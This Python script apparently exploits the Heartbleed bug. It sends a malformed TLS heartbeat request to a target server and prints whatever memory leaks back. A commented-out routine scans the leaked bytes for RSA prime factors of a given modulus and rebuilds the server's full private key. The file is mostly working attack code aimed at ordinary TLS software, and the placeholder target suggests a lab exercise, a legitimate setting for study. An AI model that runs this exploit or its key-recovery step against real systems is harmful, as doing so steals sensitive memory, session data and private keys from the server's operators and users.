import socket
import time
import os
import math
#from gmpy2 import *

'''
def findPrivateKeys(exponent, modulus, data_stream):
    n = int (modulus)
    keysize = (int) ((n).bit_length() / 16)
    primes = []
    for offset in range(0, (int) (len(data_stream) - keysize)):
        p = (int) (''.join (["%02x" % ord (data_stream[x]) for x in range (offset + keysize - 1, offset - 1, -1)]).strip(), 16)
        if(gmpy2.is_prime(p) and p != n and n % p == 0):
            q = n / p
            phi = (p - 1) * (q - 1)
            d = gmpy2.invert(exponent, phi)
            dp = d % (p - 1)
            dq = d % (q - 1)
            qinv = gmpy2.invert(q, p)
            seq = Sequence()
            for x in [0, n, e, d, p, q, dp, dq, qinv]:
                seq.setComponentByPosition (len (seq), Integer (x))
            primes.append(base64.encodestring(encoder.encode (seq)))
    return primes
    '''

def heartbleed_exploit(target, port=443):
    try:
        print("[*] Connecting to ", {target}, ":", {port}, "...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        sock.settimeout(10)

        print("[*] Sending malicious Heartbeat request...")
        heartbeat_request = b"\x18\x03\x01\x00\x03\x01\x40\x00"
        sock.send(heartbeat_request)
        print("Sent ", {heartbeat_request})

        print("[*] Reading leaked memory...")
        time.sleep(5)
        leaked_data = sock.recv(65535)#.decode(errors="ignore")
        if len(leaked_data) > 7:
            print("[+] Possible leaked data:", {leaked_data[7:][:50]}, "...")
            print("[+] Dump of potentially leaked data: ", leaked_data.rstrip(b'\x00'))
        else:
            print("[-] No leaked memory detected (server may not be vulnerable).")

        sock.close()
    except Exception as e:
        print("[-] Error: ", {e})
    
    return leaked_data

# Test against a target
target = "server"
#payloads = [b'\x03', b'\xA4', b'\x32']
#for p in payloads:
data = heartbleed_exploit(target, 8000)
#mod = 0xC9BF931E2D04DEF360557EFA29C47938AF390049045A74B18D9FA6A8EA27AE3AD7CE3C66573739097CFF15D8F5AD7CEDA632539A8DF494429F1BAC0FA22C70FC80AAC7ADEBEC09871E3A12BA9988CFFC1717C0794F8BD55903E8999726CF01F42ED6E052AF1A2E1727EF5FBC32CAE7B130AD540FF01FD7A736DB89C1B1190CCB1A63C095DA86CC40E7CD27C57E20D19AF47E08E9DD3AAA4E1203DC760CE60D743F9B9F2651F5DD32BDBC7F9AEC6FC592E96B285FDF3E6C271E0B7916DBDB48CE3811D571F2FB07606096E09AFC36B05F410182A441BBB23039380E242AD087B7E7C142ADC043B399E37B9804CF10282A8BF25EC31864603FC68A7D10417EA5CF
#print(findPrivateKeys(65537, mod, data))
